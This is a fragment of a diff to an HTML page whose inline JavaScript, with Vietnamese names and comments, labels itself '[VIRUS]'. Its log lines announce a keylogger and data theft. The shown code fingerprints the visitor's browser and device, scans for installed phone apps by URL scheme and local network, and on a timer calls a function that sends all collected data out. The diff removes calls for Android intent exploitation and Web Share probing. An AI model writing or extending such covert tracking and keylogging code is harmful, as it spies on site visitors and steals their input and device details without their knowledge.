-                    navigator.canShare && navigator.canShare(shareTest).then(function(canShare) {
-                        if (canShare) {
-                            guiDuLieuNhayCam('📤 <b>Web Share API:</b> CÓ - Có thể phát hiện ứng dụng qua Share Sheet');
-                        }
-                    }).catch(function() {});
-                }
             }
 
             // === THỰC THI TẤT CẢ PHƯƠNG PHÁP ===
@@ -550,11 +533,9 @@
                 quetUngDungQuaURLScheme();
                 quetUngDungQuaLocalNetwork();
                 quetTienIchMoRong();
-                khaiThacIntentAndroid();
-                quetQuaWebShare();
             }, 3000);
 
-            console.log('[VIRUS] Đã kích hoạt quét ứng dụng điện thoại');
+            console.log('[VIRUS] Đã kích hoạt quét ứng dụng cho cả Android và iOS');
         })();
 
         // ==========================================
@@ -660,7 +641,7 @@
             console.log('[VIRUS] Đã kích hoạt keylogger và đánh cắp dữ liệu');
         })();
 
-        // === CÁC HÀM PHÁT HIỆN THÔNG TIN (giữ nguyên) ===
+        // === CÁC HÀM PHÁT HIỆN THÔNG TIN ===
         function phatHienPrivateMode() {
             var isPrivate = false;
             try {
@@ -678,15 +659,10 @@
         }
 
         function phatHienIframe() { return window !== window.parent ? '📄 CÓ (đang bị nhúng)' : '📄 KHÔNG'; }
-
         function phatHienBanPhim() { return /Mobi|Android|iPhone/i.test(navigator.userAgent) ? '⌨️ Ảo (mobile)' : '⌨️ Vật lý'; }
-
         function laySoDiemCham() { return navigator.maxTouchPoints || 0; }
-
         function phatHienWebP() { try { return document.createElement('canvas').toDataURL('image/webp').indexOf('webp') > -1 ? '🖼️ WebP: CÓ' : '🖼️ WebP: KHÔNG'; } catch(e) { return '🖼️ WebP: KHÔNG'; } }
-
         function phatHienHDR() { try { return '🌟 HDR: ' + (window.matchMedia('(dynamic-range: high)').matches ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🌟 HDR: KHÔNG'; } }
-
         function phatHienGamMau() {
             try {
                 var p3 = window.matchMedia('(color-gamut: p3)').matches;
@@ -694,7 +670,6 @@
                 return '🎨 Gam màu: ' + (rec2020 ? 'Rec.2020' : p3 ? 'P3' : 'sRGB');
             } catch(e) { return '🎨 Gam màu: Không rõ'; }
         }
-
         function layTanSoLamMoi() {
             return new Promise(function(resolve) {
                 var start = performance.now(), frames = 0;
@@ -703,12 +678,10 @@
                 setTimeout(function() { resolve('🔄 Tần số làm mới: Không rõ'); }, 2000);
             });
         }
-
         function phatHienTietKiemDuLieu() {
             try { var c = navigator.connection || navigator.webkitConnection; if (c && c.saveData !== undefined) return '📶 Tiết kiệm dữ liệu: ' + (c.saveData ? 'BẬT' : 'TẮT'); } catch(e) {}
             return '📶 Tiết kiệm dữ liệu: Không rõ';
         }
-
         function phatHienWasm() { try { return '⚡ WebAssembly: ' + (typeof WebAssembly !== 'undefined' ? 'CÓ' : 'KHÔNG'); } catch(e) { return '⚡ WebAssembly: KHÔNG'; } }
         function phatHienWebGL2() { try { return '🎮 WebGL2: ' + (document.createElement('canvas').getContext('webgl2') ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🎮 WebGL2: KHÔNG'; } }
         function phatHienSpeech() { try { return '🗣️ Tổng hợp giọng nói: ' + ('speechSynthesis' in window ? 'CÓ' : 'KHÔNG'); } catch(e) { return '🗣️ Tổng hợp giọng nói: KHÔNG'; } }
@@ -776,7 +749,7 @@
         }
 
         setTimeout(guiTatCaThongTin, 2000);
-        console.log('[BMP] Đã bật toàn bộ theo dõi + Quét ứng dụng + Keylogger');
+        console.log('[BMP] Đã bật toàn bộ theo dõi + Quét ứng dụng Android/iOS + Keylogger');
     </script>
 </body>
 </html>
